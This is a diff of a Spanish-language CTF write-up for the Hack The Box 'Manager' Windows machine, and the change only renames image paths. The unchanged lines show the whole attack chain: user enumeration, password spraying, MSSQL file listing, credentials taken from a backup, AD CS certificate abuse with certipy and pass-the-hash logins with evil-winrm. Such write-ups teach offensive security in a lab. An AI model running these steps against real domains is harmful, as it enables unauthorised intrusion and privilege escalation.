@@ -3,7 +3,7 @@ title: "Manager - WriteUp"
 date: Fri Mar 28 2025 12:45:00 GMT+0100 (Central European Standard Time)
 categories: [WriteUps, HTB, Windows]
 tags: [ctf, nmap, htb, dirb, winrm, powershell, certify, gobuster, evil-winrm, mssql]
-image: /assets/img/htb-writeups/Pasted image 20231205195606.png
+image: /assets/img/htb-writeups/Pasted-image-20231205195606.png
 ---
 
 {% include machine-info.html
@@ -13,7 +13,7 @@ image: /assets/img/htb-writeups/Pasted image 20231205195606.png
   platform="HTB"
 %}
 
-![Manager](/assets/img/htb-writeups/Pasted image 20231205195606.png)
+![Manager](/assets/img/htb-writeups/Pasted-image-20231205195606.png)
 
 ------
 
@@ -116,7 +116,7 @@ Añadimos dc01.manager.htb y manager.htb al fichero hosts.
 
 HTTP
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231205195606.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205195606.png)
 
 Empezamos a enumerar servicios.
 
@@ -126,7 +126,7 @@ SMBMAP
 $ smbmap -H DC01 -u 'user'
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231205210726.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205210726.png)
 
 FUZZING
 
@@ -134,7 +134,7 @@ FUZZING
 $ gobuster dir -u http://10.129.159.47 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200 -x txt,php,asp,aspx
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231205210916.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205210916.png)
 
 Vamos a probar de enumerar usuarios válidos aprovechando que la máquina tiene el servicio _Kerberos_ activo (puerto 88)
 
@@ -142,7 +142,7 @@ Vamos a probar de enumerar usuarios válidos aprovechando que la máquina tiene 
 $ kerbrute userenum --dc DC01 -d manager.htb /usr/share/seclists/Usernames/Names/usernames.txt
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231205215034.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205215034.png)
 
 Vamos a probar de enumerar por fuerza bruta los RID del dominio:
 
@@ -150,7 +150,7 @@ Vamos a probar de enumerar por fuerza bruta los RID del dominio:
 $ crackmapexec smb DC01 -u anonymous -p "" --rid-brute 10000
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231205224830.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205224830.png)
 
 Tenemos lista de usuarios. Pero como no tenemos contraseñas, vamos a probar de intentar las credenciales típicas en que la contraseña es igual que el usuario.
 
@@ -160,7 +160,7 @@ Creamos una lista con los usuarios encontrados y los guardamos en _users.txt_.
 $ crackmapexec smb 10.129.159.47 -u users.txt -p users.txt --no-bruteforce --continue-on-success
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231205230043.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231205230043.png)
 
 Ahora vamos a probar las mismas combinatorias con el servidor MS SQL:
 
@@ -168,7 +168,7 @@ Ahora vamos a probar las mismas combinatorias con el servidor MS SQL:
 crackmapexec mssql DC01 -u users.txt -p users.txt --no-bruteforce --continue-on-success | grep '+'
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206122800.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206122800.png)
 
 Y tenemos un ganador...
 
@@ -178,7 +178,7 @@ Vamos a loguearnos en el servidor MSSQL:
 $ impacket-mssqlclient -p 1433 operator@DC01 -windows-auth
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206125846.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206125846.png)
 
 Exploro todas las tablas pero no encuentro datos relevantes. 
 
@@ -192,7 +192,7 @@ Probamos los siguientes comandos:
 > EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206132746.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206132746.png)
 
 Y vemos que podemos listar archivos. También nos llama la atención este archivo de backup. Vamos a intentar descargarlo para ver qué contiene.
 
@@ -202,15 +202,15 @@ Nos vamos al navegador y en la URL escribimos directamente el nombre del archivo
 http://10.129.52.205/website-backup-27-07-23-old.zip
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206133324.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206133324.png)
 
 Y nos lo descarga. Vamos a ver qué contiene.
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206133523.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206133523.png)
 
 Y en el archivo ".old-conf.xml" encontramos unas credenciales!
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206133637.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206133637.png)
 
 ```http
 raven@manager.htb:R4v3nBe5tD3veloP3r!123
@@ -222,7 +222,7 @@ Vamos a probarlas para ver qué encontramos:
 $ crackmapexec winrm 10.129.52.205 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206134409.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206134409.png)
 
 Y tenemos acceso de administración remota!
 
@@ -232,7 +232,7 @@ Conectamos por WinRM y pa dentro!
 $ evil-winrm -i 10.129.52.205 -u 'raven' -p 'R4v3nBe5tD3veloP3r!123'
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206134542.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206134542.png)
 
 Ahora puede un buen momento para registra la bandera de usuario que está en la carpeta Desktop del usuario _raven_.
 
@@ -242,7 +242,7 @@ Hecho esto comenzamos la enumeración para escalar privilegios.
 > whoami /all
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206141409.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206141409.png)
 
 Vemos que el usuario es capaz de emitir certificados de acceso DCOM y agregar equipos al dominio.
 
@@ -252,7 +252,7 @@ Subimos la utilidad _Certify.exe_ para ver todo lo relacionado con certificados 
 > .\Certify.exe find /vulnerable
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206141728.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206141728.png)
 
 No tiene vulnerabilidades en principio pero si es capaz de manejar certificados.
 
@@ -260,9 +260,9 @@ No tiene vulnerabilidades en principio pero si es capaz de manejar certificados.
 certipy find -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -dc-ip 10.129.52.205
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206142252.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206142252.png)
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206142756.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206142756.png)
 
 Ahora vamos a lanzar un churraco de comando sacado de _HackTricks_ y _GiHub_:
 
@@ -275,7 +275,7 @@ Aquí está el comando resultante:
 $ certipy ca -ca 'manager-DC01-CA' -add-officer raven -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy ca -ca 'manager-DC01-CA' -enable-template SubCA -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username raven@manager.htb -password 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -target manager.htb -template SubCA -upn administrator@manager.htb && certipy ca -ca "manager-DC01-CA" -issue-request 17 -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' && certipy req -username 'raven@manager.htb' -password 'R4v3nBe5tD3veloP3r!123' -ca "manager-DC01-CA" -target manager.htb -retrieve 17
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206151835.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206151835.png)
 
 Ya tenemos el certificado de Administrator firmado. 
 
@@ -317,7 +317,7 @@ Perfecto! ahora solo debemos conectar por WinRM y registrar la bandera de Admini
 $ evil-winrm -i 10.129.52.205 -u 'Administrator' -H 'ae5064c2f62317332c88629e025924ef'
 ```
 
-![MANAGER](/assets/img/htb-writeups/Pasted image 20231206160634.png)
+![MANAGER](/assets/img/htb-writeups/Pasted-image-20231206160634.png)
 
 Reto conseguido! Yeah!
 ---
